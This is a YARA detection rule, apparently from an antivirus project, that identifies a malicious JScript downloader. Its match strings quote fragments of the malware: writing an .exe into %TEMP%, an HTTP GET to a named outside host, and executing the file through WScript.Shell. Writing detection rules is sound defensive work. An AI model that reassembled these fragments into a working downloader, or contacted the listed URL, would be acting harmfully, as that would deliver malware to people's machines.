rule sig_20160328_c4a13c5c65a5b38db1bc17661641b8a9 {
  meta:
    description = "datamaliciousorder - file 20160328_c4a13c5c65a5b38db1bc17661641b8a9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "45ad1a407fc289f429e4cb587ba73fb4374ce3692fa47bfbce0f87889b2bde7f"

  strings:
    $s1  = "function Xbnblxoxot() {return Phurpva[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"CZUA7xSsiRDBr.exe\";};" fullword ascii
    $s2  = "Xkvvepif[Bwdlaxzapm](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Xyhtyb](Gqnsw() * 11)} while (Xkvvepif[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Phurpva = function Dcjthc() {return WScript[Trekli](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rzpbdvftpq(Zuacre){Phurpva[\"Run\"](Zuacre, Reock, Reock);};" fullword ascii
    $s6  = "function Hnsaexj(Usdbja, Yqcwvrayt){return Usdbja - Yqcwvrayt;};" fullword ascii
    $s7  = "function Hspot() {return ((Ojbelww == true) && (Ojbelww == Kratn)) ? 1 : Reock;};" fullword ascii
    $s8  = "var Nlotrs = new this[\"Date\"]();" fullword ascii
    $s9  = "var Ojbelww = false;" fullword ascii
    $s10 = "var Dnhqrx = false;" fullword ascii
    $s11 = "Kratn = true; " fullword ascii
    $s12 = "function Xtthtlbdvl()" fullword ascii
    $s13 = "return Hnsaexj(Lkwznbphe, Cytuwghsc);" fullword ascii
    $s14 = "function Qkxtwnkk(){return Trekli;};" fullword ascii
    $s15 = "function Xjpbmg(Fhtqjibe) {var Fgjtaifayb = (1, 2, 3, 4, 5, Fhtqjibe); return Fgjtaifayb;};" fullword ascii
    $s16 = "var Kratn = false;" fullword ascii
    $s17 = "Ojbelww = true; " fullword ascii
    $s18 = "function Gqnsw(){return 22;};" fullword ascii
    $s19 = " while (Nywyjpqzt){" fullword ascii
    $s20 = "function Ocaanblrh(){return Uhxortpl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}